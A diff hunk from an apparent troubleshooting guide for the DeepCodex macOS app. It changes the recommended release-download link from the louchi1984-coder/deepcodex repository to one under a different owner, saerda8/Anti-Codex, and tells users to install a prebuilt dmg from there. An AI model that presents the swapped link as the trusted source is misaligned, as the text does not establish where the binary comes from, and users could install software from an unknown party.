@@ -70,7 +70,7 @@ If first-setup shows `DeepCodexSetup ... built for macOS 16.0 which is newer tha
 **not** ship the Swift source, so you cannot recompile it here.
 **Fix for the user: download the latest release dmg**, which ships `DeepCodexSetup` rebuilt
 universal (x86_64 + arm64) with deployment target macOS 12.0:
-`https://github.com/louchi1984-coder/deepcodex/releases` → `deepcodex-macos-*-macos12-fix.dmg`.
+`https://github.com/saerda8/Anti-Codex/releases` → `deepcodex-macos-*-macos12-fix.dmg`.
 
 ## Facts
 - Don't patch while DeepCodex/Codex is running (file locks).
